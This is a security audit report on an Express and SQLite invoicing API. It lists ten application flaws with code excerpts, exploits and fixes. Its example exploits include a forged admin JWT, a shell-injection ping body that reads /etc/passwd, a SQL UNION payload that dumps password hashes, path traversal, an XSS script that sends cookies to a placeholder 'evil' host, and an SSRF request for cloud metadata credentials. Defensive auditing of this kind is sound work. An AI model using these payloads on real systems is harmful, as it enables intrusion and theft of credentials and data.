# Security Audit — Ledgerly 1.4.2

Express + `node:sqlite` invoicing API. Audit of all application source under `src/`.
Dependencies (express 4.22.3, jsonwebtoken 9.0.3, send 0.19.2, etc.) are current with no
known-vulnerable versions, so all findings below are in the application code.

Findings are ordered by severity. Line numbers refer to the files as committed.

---

## 1. Hardcoded JWT signing secret → full authentication & admin bypass — CRITICAL
**File:** `src/config.js:3`
```js
jwtSecret: 'ledgerly-dev-secret-2024',
```
The HS256 signing secret is a hardcoded constant committed to the repository. Anyone
who can see the source (public repo, leaked build, former employee) knows the secret and
can forge a valid token for any user with any role:
```
jwt.sign({ sub: 1, role: 'admin' }, 'ledgerly-dev-secret-2024', { algorithm:'HS256' })
```
That token passes `requireAuth`/`requireAdmin` (`src/lib/auth.js:17-29`), granting complete
account takeover, admin access, and — chained with finding #2 — remote code execution. No
login or password is needed. **Exploit:** craft a token offline, send it as `Authorization:
Bearer <token>` to any endpoint.

## 2. OS command injection in diagnostics ping — CRITICAL
**File:** `src/routes/tools.js:22`
```js
exec(`ping -c 1 ${req.body.host}`, { timeout: 5000 }, ...)
```
`req.body.host` is interpolated straight into a shell command run via `child_process.exec`.
Any value with shell metacharacters executes arbitrary commands on the host.
**Exploit:** `POST /api/tools/diagnostics/ping` with body `{"host":"x; cat /etc/passwd; id"}`
(or `$(...)`/backticks) runs attacker commands as the server user. Route is `requireAdmin`,
but admin is trivially obtained via finding #1 (forged token) or finding #3 (self-promotion),
so this is reachable by any outsider → full RCE. Contrast the adjacent git endpoint
(`tools.js:26-30`) which correctly uses `execFile` with an allow-list.

## 3. Mass-assignment privilege escalation on profile update — CRITICAL
**File:** `src/routes/users.js:12`
```js
const fields = Object.keys(req.body).filter((k) => ['name','company','email','role'].includes(k));
```
`role` is in the list of self-updatable fields. Any authenticated user can promote
themselves to admin.
**Exploit:** `PATCH /api/users/me` with body `{"role":"admin"}`. The subsequent request
is now admin and can reach the command-injection endpoint (#2) and any admin surface.
`email` being updatable also allows account/identity takeover of another account's email
(no uniqueness re-check handling) and is a privacy issue.

## 4. SQL injection in invoice search — CRITICAL
**File:** `src/routes/invoices.js:19`
```js
const rows = db.prepare(`SELECT * FROM invoices WHERE owner_id = ${req.user.sub} AND customer LIKE '%${q}%'`).all();
```
Both `req.user.sub` and the user-supplied `q` are concatenated into the SQL string instead
of being bound as parameters. `q` is fully attacker-controlled.
**Exploit:** `GET /api/invoices/search?q=' UNION SELECT id,email,password_hash,role,company,
notes,share_token,created_at FROM users-- ` dumps every user's email and `password_hash`
(enabling offline cracking), and defeats the `owner_id` scoping to read all tenants' invoices.
Everything else in the file uses proper `?` binding — this line is the lone exception.

## 5. Path traversal / arbitrary file read in attachment download — HIGH
**File:** `src/routes/files.js:11-13`
```js
const file = path.join(config.uploadDir, req.query.name || '');
if (!fs.existsSync(file)) return res.status(404).end();
res.sendFile(file);
```
`req.query.name` is joined to the upload dir with no sanitization or containment check.
`path.join` collapses `../` segments, and `res.sendFile` accepts the resulting absolute path
(the `UP_PATH_REGEXP` guard in `send` only applies when a `root` option is set, which it is
not here). Any authenticated user reads arbitrary files.
**Exploit:** `GET /api/files/attachments?name=../../../../etc/passwd` (or the app's own
`ledgerly.db`, config, source). The sibling export route (`files.js:17-22`) shows the correct
pattern — `path.basename` + `startsWith(resolve(dir)+sep)` + extension check — which this
route omits.

## 6. Broken object-level authorization (IDOR) on invoice fetch — HIGH
**File:** `src/routes/invoices.js:23-27`
```js
router.get('/:id', (req, res) => {
  const inv = db.prepare('SELECT * FROM invoices WHERE id = ?').get(Number(req.params.id));
  ...
```
Lookup is by `id` only, with no `owner_id = req.user.sub` filter, so any authenticated user
can read any other tenant's invoice — customer name, amount, private `notes`, and the
`share_token` (which is the public-page capability, see #7). The list, delete, and `/`
endpoints all scope by `owner_id`; this one does not.
**Exploit:** `GET /api/invoices/2`, `/3`, … enumerates all invoices across accounts.

## 7. Stored XSS on the public invoice page — HIGH
**File:** `src/routes/share.js:13`
```js
<div class="notes">${inv.notes}</div>
```
`inv.notes` is interpolated into HTML unescaped, while `inv.customer` on the line above is
correctly passed through `esc()`. Notes are attacker-controlled (set at invoice create/`POST
/api/invoices`). The share page at `/i/:token` is public and unauthenticated.
**Exploit:** create an invoice with `notes` = `<script>fetch('https://evil/?'+document.cookie)
</script><img src=x onerror=...>`, then send the victim the `/i/<share_token>` link; script
runs in the victim's browser. Combined with #6 an attacker can also harvest valid share tokens.

## 8. Server-Side Request Forgery in link-preview — MEDIUM/HIGH
**File:** `src/routes/tools.js:9-14`
```js
const r = await fetch(req.query.url, { redirect: 'follow' });
const html = await r.text();
const m = html.match(/<title>([^<]*)<\/title>/i);
res.json({ title: m ? m[1] : null, status: r.status });
```
Any authenticated user controls the full URL fetched server-side, with redirects followed.
No scheme/host allow-list, no blocking of private/link-local ranges.
**Exploit:** `GET /api/tools/preview?url=http://169.254.169.254/latest/meta-data/iam/
security-credentials/` (cloud metadata), or `http://127.0.0.1:…`, or internal hostnames —
reflecting the response status and `<title>` back, and usable as a blind internal port/host
scanner. `redirect:'follow'` also enables public→internal redirect bypasses.

## 9. Password hash cracking exposure via weak KDF parameters — LOW/MEDIUM
**File:** `src/lib/auth.js:5-7`
`scryptSync(pw, salt, 32)` uses scrypt with default cost parameters (N=16384) and no
per-deployment pepper. It is salted and uses `timingSafeEqual` on compare (good), but the
default cost is modest for a financial app; given the hash-exfiltration paths (#4, #5), raising
the cost factor / adding a secret pepper is warranted. Informational-to-low on its own.

## 10. No brute-force / rate limiting on login & register — LOW
**File:** `src/routes/auth.js:12-15`
`POST /api/auth/login` has no attempt throttling, lockout, or delay, allowing online
password guessing. `register` likewise is unthrottled (account-spam / DB growth). A duplicate
email also hits the `UNIQUE` constraint and throws uncaught (`auth.js:8`), surfacing a 500 and
enabling account enumeration. Add rate limiting and wrap the insert in try/catch returning a
generic error.

---

## Summary table

| # | Severity | File:Line | Issue |
|---|----------|-----------|-------|
| 1 | Critical | src/config.js:3 | Hardcoded JWT secret → token forgery, admin takeover |
| 2 | Critical | src/routes/tools.js:22 | OS command injection via `exec` (ping host) → RCE |
| 3 | Critical | src/routes/users.js:12 | Mass-assignment: self-promote to `admin` |
| 4 | Critical | src/routes/invoices.js:19 | SQL injection in `/search` (q + owner_id) |
| 5 | High | src/routes/files.js:11 | Path traversal → arbitrary file read |
| 6 | High | src/routes/invoices.js:23 | IDOR: read any invoice (no owner check) |
| 7 | High | src/routes/share.js:13 | Stored XSS via unescaped invoice notes |
| 8 | Med/High | src/routes/tools.js:11 | SSRF in `/preview` (metadata, internal scan) |
| 9 | Low/Med | src/lib/auth.js:5 | Default scrypt cost, no pepper |
| 10 | Low | src/routes/auth.js:12 | No login rate limiting; register enumeration/500 |

**Chaining note:** #1 or #3 grants admin, which unlocks #2 → unauthenticated (via forged
token) remote code execution is the worst-case path. #4 and #5 both independently exfiltrate
password hashes, and #6 leaks share tokens that feed #7.

## Recommended priority fixes
1. Load `jwtSecret` from a required env var; fail startup if unset. Rotate the leaked secret.
2. Remove `role` (and ideally `email` without verification) from self-updatable fields.
3. Replace `exec` in the ping endpoint with `execFile('ping', ['-c','1', host])` plus host validation.
4. Parameterize the `/search` query (bind `owner_id` and use `LIKE ?` with `%q%` as a bound value).
5. Add owner scoping to `GET /api/invoices/:id`.
6. Sanitize `/attachments` the same way `/exports` already does (basename + containment check).
7. HTML-escape `inv.notes` in the share page.
8. Allow-list / block private ranges and schemes in `/preview`; consider disabling redirects.
9. Add login rate limiting; wrap register insert in try/catch.
